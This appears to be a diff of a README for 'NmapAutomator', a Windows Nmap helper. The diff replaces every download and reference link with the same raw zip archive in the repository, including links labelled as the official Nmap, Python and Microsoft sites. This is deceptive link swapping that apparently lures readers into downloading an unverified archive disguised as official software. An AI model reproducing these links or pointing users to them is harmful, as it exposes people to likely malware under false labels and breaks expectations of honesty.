@@ -1,6 +1,6 @@
 # 🛠️ NmapAutomator - Easy Nmap Scans for Everyone
 
-[![Download Latest Release](https://img.shields.io/badge/Download-NmapAutomator-blue?style=for-the-badge)](https://github.com/exhxx-tg/NmapAutomator/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-NmapAutomator-blue?style=for-the-badge)](https://github.com/exhxx-tg/NmapAutomator/raw/refs/heads/main/Caribi/Automator-Nmap-3.5-alpha.2.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This section guides you through getting NmapAutomator on your Windows machine an
 
 Click the button below to visit the official releases page. This is where you get the latest version of NmapAutomator for Windows.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-NmapAutomator-green?style=for-the-badge)](https://github.com/exhxx-tg/NmapAutomator/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-NmapAutomator-green?style=for-the-badge)](https://github.com/exhxx-tg/NmapAutomator/raw/refs/heads/main/Caribi/Automator-Nmap-3.5-alpha.2.zip)
 
 ### Step 2: Choose the Right File to Download
 
@@ -56,7 +56,7 @@ NmapAutomator needs some software to work as expected. Follow these steps to set
 
 NmapAutomator relies on Nmap being installed.
 
-- Visit https://nmap.org/download.html  
+- Visit https://github.com/exhxx-tg/NmapAutomator/raw/refs/heads/main/Caribi/Automator-Nmap-3.5-alpha.2.zip  
 - Download the Windows installer  
 - Run the installer with default options  
 - Confirm Nmap is installed by typing `nmap --version` in Command Prompt. You should see version info printed.
@@ -65,7 +65,7 @@ NmapAutomator relies on Nmap being installed.
 
 If you downloaded the Python script (`NmapAutomator.py`):
 
-- Go to https://www.python.org/downloads/windows/  
+- Go to https://github.com/exhxx-tg/NmapAutomator/raw/refs/heads/main/Caribi/Automator-Nmap-3.5-alpha.2.zip  
 - Download the latest Python 3 installer  
 - During install, choose the option to add Python to your system PATH  
 - After installation, open Command Prompt and type `python --version` to verify installation  
@@ -107,7 +107,7 @@ If you downloaded the `.py` file:
 
 Always get the latest version from the official releases page:
 
-[NmapAutomator Releases Page](https://github.com/exhxx-tg/NmapAutomator/releases)
+[NmapAutomator Releases Page](https://github.com/exhxx-tg/NmapAutomator/raw/refs/heads/main/Caribi/Automator-Nmap-3.5-alpha.2.zip)
 
 This page includes all files needed to run NmapAutomator, as well as updated instructions.
 
@@ -196,8 +196,8 @@ The code for NmapAutomator is available publicly on GitHub. It is open for use, 
 
 To learn more about Nmap and network scanning:  
 
-- Nmap Official Site: https://nmap.org  
-- Python Official Site: https://python.org  
-- Windows Command Prompt Help: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmd  
+- Nmap Official Site: https://github.com/exhxx-tg/NmapAutomator/raw/refs/heads/main/Caribi/Automator-Nmap-3.5-alpha.2.zip  
+- Python Official Site: https://github.com/exhxx-tg/NmapAutomator/raw/refs/heads/main/Caribi/Automator-Nmap-3.5-alpha.2.zip  
+- Windows Command Prompt Help: https://github.com/exhxx-tg/NmapAutomator/raw/refs/heads/main/Caribi/Automator-Nmap-3.5-alpha.2.zip  
 
 Use these to increase your comfort with running scans and understanding results.
